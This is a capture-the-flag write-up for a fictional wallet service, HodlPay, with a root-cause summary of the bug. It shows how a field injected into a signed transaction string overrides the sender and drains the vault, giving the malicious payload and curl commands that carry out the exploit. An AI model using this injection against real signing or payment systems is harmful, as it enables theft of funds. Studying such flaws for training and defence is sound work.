# Signature Swap

## Challenge Description

HodlPay is a modern digital wallet platform. Every transaction request must be signed by the platform's signing service before the ledger will execute it. You can sign in with any username, receive a wallet address and balance, and author signed transaction requests to move funds between wallets.

## Reconnaissance

The application is a single-page digital wallet with the following main endpoints:

- `POST /api/login` – Authenticate with any username and receive a JWT-like token + wallet address
- `GET /api/me` – View your address and balance
- `GET /api/vault` – View the Central Reserve Vault address and balance
- `POST /api/wallet/sign` – Request a signature for a transfer
- `POST /api/transactions` – Submit a signed transaction
- `GET /api/transactions` – View the ledger

After logging in, a user receives a wallet address of the form `addr-<username>` and a starting balance of 1000. The Central Reserve Vault (`R-VAULT-7c4a1b9e`) holds a very large balance (1,000,000,000).

Signing a transfer returns a payload in the following format:

```
addr:<from>;to:<to>;amount:<amount>
```

along with an HMAC-SHA256 signature of that exact string.

## Understanding the Signing Flow

1. The client calls `/api/wallet/sign` with a destination address and amount.
2. The server constructs the canonical string using the authenticated user’s address as the `addr` field.
3. The server returns the string + its HMAC-SHA256 signature.
4. The client later submits the exact same string + signature to `/api/transactions`.
5. The server verifies the HMAC and then parses the string to extract `from`, `to`, and `amount`.

## Vulnerability

The transaction parser extracts values by taking the **last** occurrence of each key (`addr`, `to`, `amount`) in the semicolon-separated string.

Because the `to` field supplied to the signing endpoint is not properly sanitized, an attacker can inject additional key-value pairs into it. The resulting string is still correctly signed by the server, so HMAC verification succeeds. However, the parser uses the injected values when constructing the actual transaction.

### Example of a malicious payload

```
addr:addr-attacker;to:addr-victim;addr:R-VAULT-7c4a1b9e;amount:1
```

- HMAC verification passes (the whole string was signed).
- The parser sees the last `addr` value as `R-VAULT-7c4a1b9e`.
- The transaction is therefore executed as a transfer **from the vault**.

## Exploitation

1. Log in with any username:

```bash
curl -s -X POST http://<host>/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker"}'
```

2. Request a signature while injecting a new `addr` field into the `to` parameter:

```bash
curl -s -X POST http://<host>/api/wallet/sign \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"to":"addr-victim;addr:R-VAULT-7c4a1b9e","amount":1}'
```

This returns a signed payload similar to:

```
data: addr:addr-attacker;to:addr-victim;addr:R-VAULT-7c4a1b9e;amount:1
sig:  <valid HMAC>
```

3. Submit the signed data unchanged:

```bash
curl -s -X POST http://<host>/api/transactions \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"data":"addr:addr-attacker;to:addr-victim;addr:R-VAULT-7c4a1b9e;amount:1","sig":"<sig>"}'
```

The server accepts the transaction as originating from the vault and returns the flag.

## Flag

```
flag{[YOUR FLAG HERE]}
```

## Root Cause Summary

The application trusted a signed string without ensuring that the string could only contain a single instance of each expected field. By allowing injection into the `to` parameter, an attacker could overwrite the `addr` field after the signature was generated, effectively swapping the transaction originator.
```